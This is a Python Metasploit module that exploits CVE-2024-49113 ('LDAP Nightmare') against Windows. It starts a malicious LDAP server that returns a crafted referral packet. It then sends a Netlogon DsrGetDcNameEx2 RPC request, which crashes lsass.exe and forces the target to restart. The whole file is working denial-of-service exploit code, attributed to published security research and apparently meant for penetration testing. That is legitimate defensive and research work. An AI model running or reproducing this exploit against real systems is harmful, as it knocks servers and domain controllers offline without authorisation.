#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Standard modules
import asyncio
import logging
import time
import threading
from typing import Any, Dict

# Extra modules
dependencies_missing = False
pureldap = None
pureber = None
nrpc = None

try:
    from impacket.dcerpc.v5 import nrpc
    from impacket.dcerpc.v5.rpcrt import DCERPCException
    from impacket.dcerpc.v5.transport import DCERPCTransportFactory
except ImportError:
    dependencies_missing = True

try:
    from ldaptor.protocols import pureldap, pureber
except ImportError:
    dependencies_missing = True

from metasploit import module

metadata = {
    'name': 'Windows LDAP Nightmare DoS',
    'description': '''
        This module triggers a vulnerability in Windows LDAP implementation that causes
        the target system to restart. It sets up a malicious LDAP server and triggers 
        the vulnerability through the DsrGetDcNameEx2 RPC call.
    ''',
    'authors': [
        'Or Yair',
        'Shahak Morag',
        '0xMetr0'
    ],
    'date': '2025-02-04',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://github.com/SafeBreach-Labs/CVE-2024-49113'},
        {'type': 'cve', 'ref': '2024-49113'}
    ],
    'type': 'dos',
    'targets': [
        {'platform': 'windows', 'arch': 'x64'}
    ],
    'privileged': True,
    'rank': 500,
    'options': {
        'RHOSTS': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'RPORT': {'type': 'port', 'description': 'Target port for RPC', 'required': True, 'default': 49664},
        'LPORT': {'type': 'port', 'description': 'Local port for LDAP server', 'required': True, 'default': 389},
        'DOMAINNAME': {'type': 'string', 'description': 'Attackers domain name', 'required': True, 'default': None},
        'ACCOUNT': {'type': 'string', 'description': 'Target account name', 'required': False, 'default': 'Administrator'},
        'SITENAME': {'type': 'string', 'description': 'Target site name', 'required': False, 'default': ''}
    }
}

# Constants
REFERRAL_RESULT_CODE = 10
NULL = '\x00'

if not dependencies_missing:
    class LDAPSearchResultDoneRefferal(pureldap.LDAPSearchResultDone):
        def toWire(self):
            elements = [
                pureber.BEREnumerated(self.resultCode),
                pureber.BEROctetString(self.matchedDN),
                pureber.BEROctetString(self.errorMessage),
            ]

            if self.resultCode == 10: # LDAP referral result code
                if self.referral:
                    elements.append(
                        pureber.BERSequence(
                            [pureber.BEROctetString(url) for url in self.referral],
                            tag=0xA3  # Context-specific tag for referral
                        )
                    )

            if self.serverSaslCreds:
                elements.append(pureldap.LDAPBindResponse_serverSaslCreds(self.serverSaslCreds))

            return pureber.BERSequence(elements, tag=self.tag).toWire()

    def get_malicious_ldap_packet(message_id: int, lm_referral: int=2) -> bytes:
        """
        Build a malicious LDAP response packet with a referral.
        The packet has the following structure:
        Result code: 10 (LDAP referral)
        Referral: ldap://referral.com (valid LDAP URL)
        Message ID: 4 bytes (big-endian) - the same as the original request with lm_referral value.
        """
        if lm_referral == 0 or lm_referral > 255:
            raise ValueError("lm_referral must be between 1 and 255")
        
        if lm_referral & 1:
            raise ValueError("lm_referral must be an even number")

        ldap_search_result = LDAPSearchResultDoneRefferal(resultCode=REFERRAL_RESULT_CODE, referral=['ldap://referral.com'])
        ldap_response_message = pureldap.LDAPMessage(value=ldap_search_result, id=message_id)
        bytes_to_send = ldap_response_message.toWire()

        lm_referral_length_index = bytes_to_send.index(b"\x02\x01") + 1
        message_id_byte = bytes_to_send[lm_referral_length_index + 1].to_bytes(length=1, byteorder='big')

        bytes_to_send = (
            bytes_to_send[:lm_referral_length_index] # Everything before the message ID
            + b"\x04" # Type and Length of the message ID
            + lm_referral.to_bytes(length=1, byteorder='big') # encoded lm_referral
            + b"\x00\x00" # Padding
            + message_id_byte # Message ID
            + bytes_to_send[lm_referral_length_index + 2:] # Rest of the packet
        )

        new_packet_length = bytes_to_send[1] + 3
        bytes_to_send = bytes_to_send[0:1] + new_packet_length.to_bytes(length=1, byteorder='big') + bytes_to_send[2:]

        return bytes_to_send

    class LdapServerProtocol(asyncio.DatagramProtocol):
        def __init__(self):
            super().__init__()
            self.berdecoder = pureldap.LDAPBERDecoderContext_TopLevel(
                inherit=pureldap.LDAPBERDecoderContext_LDAPMessage(
                    fallback=pureldap.LDAPBERDecoderContext(
                        fallback=pureber.BERDecoderContext()
                    ),
                    inherit=pureldap.LDAPBERDecoderContext(
                        fallback=pureber.BERDecoderContext()
                    ),
                )
            )
            self.transport = None

        def connection_made(self, transport: asyncio.DatagramTransport) -> None:
            self.transport = transport
            module.log("NetLogon connected", level='good')

        def datagram_received(self, data: bytes, addr: Any) -> None:
            # Parse the received data
            ldap_message, _ = pureber.berDecodeObject(self.berdecoder, data)
            module.log(f"Received LDAP request from NetLogon {addr}", level='good')
            # Build the "vulnerable" response packet
            vulnerable_ldap_packet = get_malicious_ldap_packet(ldap_message.id)
            module.log(f"Sending malicious LDAP response packet", level='debug')
            # Send back to client
            self.transport.sendto(vulnerable_ldap_packet, addr)

        def connection_refused(self, exc: Exception) -> None:
            module.log(f"Connection refused: {exc}", level='error')

        def error_received(self, exc: Exception) -> None:
            module.log(f"Error received: {exc}", level='error')

    async def run_exploit_server(listen_port: int):
        loop = asyncio.get_running_loop()
        transport, _ = await loop.create_datagram_endpoint(
            lambda: LdapServerProtocol(),
            local_addr=('0.0.0.0', listen_port)
        )

        try:
            await asyncio.Future()  
        except KeyboardInterrupt:
            pass
        finally:
            transport.close()
            module.log("Server has been shut down", level='info')

    def start_ldap_server(listen_port: int):
        """Run the async LDAP server in this thread."""
        asyncio.run(run_exploit_server(listen_port))

    def DsrGetDcNameEx2(target_ip: str, port: int, account: str, site_name: str, domain_name: str):
        # Build the RPC transport using ncacn_ip_tcp over <target_ip>:<port>
        rpctransport = DCERPCTransportFactory(f'ncacn_ip_tcp:{target_ip}[{port}]')
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        module.log(f"Connected to {target_ip}:{port}", level='info')
        
        try:
            dce.bind(nrpc.MSRPC_UUID_NRPC)
        except DCERPCException:
            module.log("Failed to bind to NRPC interface!", level='error')
            module.log("This might be because the target doesn't have netlogon service running.", level='info')
            raise

        request = nrpc.DsrGetDcNameEx2()
        request['ComputerName'] = NULL
        request['AccountName'] = account + NULL
        request['AllowableAccountControlBits'] = 1 << 9
        request['DomainName'] = domain_name + NULL
        request['DomainGuid'] = NULL
        request['SiteName'] = site_name + NULL
        request['Flags'] = 0

        module.log("Sending DsrGetDcNameEx2 request...", level='info')
        resp = dce.request(request)
        resp.dump()
        dce.disconnect()

def run(args):
    if dependencies_missing:
        module.log('Module dependencies (impacket, ldaptor) are missing, cannot continue', level='error')
        return

    try:
        # 1. Start the exploit server in a background thread.
        server_thread = threading.Thread(
            target=start_ldap_server,
            daemon=True,
            args=(int(args['LPORT']),)
        )
        server_thread.start()

        # 2. Optionally, wait a moment to ensure server is listening
        module.log("Waiting for LDAP server to start...", level='info')
        time.sleep(2)

        # 3. Now call your RPC function
        module.log("Calling DsrGetDcNameEx2...", level='info')
        try:
            DsrGetDcNameEx2(
                target_ip=args['RHOSTS'],
                port=int(args['RPORT']),
                account=args['ACCOUNT'],
                site_name=args['SITENAME'],
                domain_name=args['DOMAINNAME']
            )
            module.log("Failed to trigger the vulnerability!", level='error')
            return False
        except ConnectionResetError:
            # Netlogon is implemented inside the lsass.exe process,
            # So the connection will be reset after the exploit is triggered.
            module.log("Successfully triggered the vulnerability!", level='good')
            module.log("Target Server will restart in one minute.", level='info')
            return True
            
    except Exception as e:
        module.log(f"Attack failed: {str(e)}", level='error')
        return False

if __name__ == '__main__':
    module.run(metadata, run)
